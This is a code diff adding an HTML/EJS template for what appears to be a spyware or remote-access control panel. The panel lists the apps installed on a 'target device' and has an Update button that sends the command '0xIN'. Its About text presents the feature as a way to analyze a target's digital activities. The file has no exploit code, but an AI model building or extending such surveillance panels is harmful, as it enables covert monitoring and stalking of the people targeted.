@@ -1,0 +1,74 @@
+
+<div class="recent-sales box">
+    <div class="title">Apps</div>
+    <div class="sales-details">
+
+        <ul class="details">
+            <li class="topic">Name</li>
+
+                <% pageData.forEach((app) => { 
+                %>
+
+                   <li><a href="#"><%= app.appName.substring(0,24) %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Package</li>
+
+                <% pageData.forEach((app) => { 
+                %>
+
+                   <li><a href="#"><%= app.packageName %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+        <ul class="details">
+            <li class="topic">Version</li>
+
+                <% pageData.forEach((app) => { 
+                %>
+
+                   <li><a href="#"><%= app.versionName.substring(0,12) %></a></li>
+
+                <% }) %>
+
+        </ul>
+
+    </div>
+
+
+
+    <button style="background: rgb(11, 0, 107); color: white; border-style: none; padding: 7px;" onclick="updateButton(this, '0xIN')">Update</button>
+
+
+
+    </div>
+
+
+    <div class="top-sales box">
+      <div class="title">About</div>
+      <ul class="top-sales-details">
+        <li>
+        <a href="#">
+          <!--<img src="images/sunglasses.jpg" alt="">-->
+          <span class="product">
+This feature enables you to see a list of all apps installed on your target device. So you must know which applications your target is using. Using this feature you can analyze your target’s digital activities.</span>
+        </a>
+      </li>
+      </ul>
+
+      <div class="button">
+        <a href="#">Learn More</a>
+      </div>
+
+    </div>
+
+
+    
+
+</div>
